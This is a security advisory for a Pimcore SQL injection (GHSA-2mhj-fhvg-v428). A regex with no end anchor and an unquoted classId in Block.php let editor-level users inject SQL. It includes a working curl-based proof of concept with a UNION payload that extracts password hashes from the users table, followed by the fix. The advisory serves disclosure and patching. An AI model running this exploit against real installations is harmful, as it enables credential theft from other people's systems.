# [H] Pimcore: ClassDefinition UID regex missing end anchor allows SQL injection via Block.php unquoted table name

## Summary
Severity: High
Advisory: GHSA-2mhj-fhvg-v428
CVE: CVE-2026-55072
CWE: CWE-20, CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-13
Source: https://github.com/advisories/GHSA-2mhj-fhvg-v428
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=2026.1.0 <2026.1.5
- Packagist: `pimcore/pimcore` — affected >=0 <12.3.9

## Details
### Summary
A missing end anchor (`$`) in the ClassDefinition UID validation regex allows an authenticated user with the `objects` permission to create a class with a malicious UID containing SQL. When a data object of that class is later loaded, Block.php concatenates the raw classId directly into a SQL query without quoting, executing the injected payload. This is an incomplete fix from commit `dbe1d131e4` which added a leading `^` anchor but omitted the trailing `$`.

### Details
### 1. Missing end anchor in ClassDefinition UID validation

`models/DataObject/ClassDefinition.php` lines 1148-1154:

```php
if (!preg_match('/^[a-zA-Z]\w+/', $this->getName())) {
    throw new Exception(sprintf('Invalid name for class definition: %s', $this->getName()));
}

if (!preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?/', $this->getId())) {
    throw new Exception(sprintf('Invalid ID `%s` for class definition %s', $this->getId(), $this->getName()));
}
```

Both patterns are missing a trailing `$` anchor. Without it, `preg_match` only checks that the string STARTS with a valid identifier — it does not assert end-of-string. A UID of `1 UNION SELECT password FROM users-- ` passes because the regex matches `1` at the start and ignores the rest.

Compare with the correct pattern used by Fieldcollection in `models/DataObject/Fieldcollection/Definition.php` line 268:

```php
if (!preg_match('/^[a-zA-Z]\w*$/', $key)) {   // has $ — correct
    return true;
}
```


### 3. Unquoted classId concatenation in Block.php

`models/DataObject/ClassDefinition/Data/Block.php` line 735:

```php
$query = 'select ' . $db->quoteIdentifier($field) . ' from object_store_' . $object->getClassId() . ' where oo_id  = ' . $object->getId();
```

`$object->getClassId()` returns the raw stored classId with no quoting. This same unquoted pattern repeats on lines 744, 746, 748, 759, and 771 for objectbrick, fieldcollection, and localized field contexts.

Compare with `models/DataObject/ClassDefinition/Dao.php` line 108-113 which correctly wraps the table name:

```php
$objectDatastoreTable = 'object_store_' . $this->model->getId();
$qObjectDatastoreTable = $this->db->quoteIdentifier($objectDatastoreTable);
```

Dao.php was hardened in commit `dbe1d131e4` but Block.php was not.


### PoC
**Prerequisites:**
- Pimcore 2026.1.x with Studio API enabled
- A user `lowpriv` with only the `objects` permission

**Step 1 — Authenticate as lowpriv and save the session cookie:**

```bash
curl -s -c /tmp/cookies.txt -X POST \
  "https://your-pimcore/pimcore-studio/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"lowpriv","password":"password"}'
```

Expected response:
```json
{"message": "Login successful"}
```

**Step 2 — Create a ClassDefinition with a malicious UID:**

```bash
curl -s -b /tmp/cookies.txt -X POST \
  "https://your-pimcore/pimcore-studio/api/class/definition/configuration-view/detail/create" \
  -H "Content-Type: application/json" \
  -d '{"name":"PocClass","uid":"1 UNION SELECT password,NULL FROM users-- "}'
```

Expected response: class definition created successfully. The UID passes the broken regex because `preg_match('/^[a-zA-Z0-9 ([a-zA-Z0-9_]+)?/', '1 UNION SELECT...')` matches `1` at the start and returns true. No exception is thrown.

The bypass can be verified independently in any PHP sandbox:

```php
var_dump(preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?/', '1 UNION SELECT password FROM users-- '));
// int(1) — PASSES, no exception thrown

var_dump(preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?$/', '1 UNION SELECT password FROM users-- '));
// int(0) — BLOCKED, correct behavior with $ anchor
```

**Step 3 — Add a Block field to the malicious class (via the class editor UI or API)**

In the Pimcore Studio UI, open `PocClass`, add a field of type `Block`, name it `myblock`, and save the class.

**Step 4 — Create a data object of the malicious class:**

```bash
curl -s -b /tmp/cookies.txt -X POST \
  "https://your-pimcore/pimcore-studio/api/data-objects" \
  -H "Content-Type: application/json" \
  -d '{"className":"PocClass","parentId":1,"key":"poc-object"}'
```

Note the returned object ID (e.g. `42`).

**Step 5 — Fetch the data object to trigger Block.php:735:**

```bash
curl -s -b /tmp/cookies.txt \
  "https://your-pimcore/pimcore-studio/api/data-objects/42"
```

When the object loads, `Block::load()` executes:

```sql
SELECT `myblock` FROM object_store_1 UNION SELECT password,NULL FROM users--
WHERE oo_id = 42
```

The `-- ` comment discards the WHERE clause. MySQL executes the UNION and returns password hashes from the `users` table in the Block field value of the response.

**Expected response (vulnerable):**

The `myblock` field value in the response contains rows from the `users` table including password hashes.

**Expected response (patched):**

Step 2 fails with a validation exception — the UID is rejected before the class is created.

**Recommended fix:**

Add trailing `$` anchors to both regex patterns in `ClassDefinition.php`:

```php
// Before (vulnerable)
if (!preg_match('/^[a-zA-Z]\w+/', $this->getName())) {
if (!preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?/', $this->getId())) {

// After (correct)
if (!preg_match('/^[a-zA-Z]\w+$/', $this->getName())) {
if (!preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?$/', $this->getId())) {
```

Additionally, wrap `$object->getClassId()` in `$db->quoteIdentifier()` in `Block.php` lines 735, 744, 746, 748, 759, and 771, consistent with how `Dao.php` handles the same value.

### Impact
An authenticated user with the `objects` permission can inject arbitrary SQL that executes when any data object of the malicious class is loaded. This allows exfiltration of any table in the Pimcore database, including the `users` table containing password hashes, using a UNION-based injection. The `objects` permission is a standard editor-level permission, not an admin privilege.

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-2mhj-fhvg-v428
- https://github.com/pimcore/pimcore/commit/33a0e1887e1e31b4283b016ac5440c35ea5697b4
- https://github.com/pimcore/pimcore
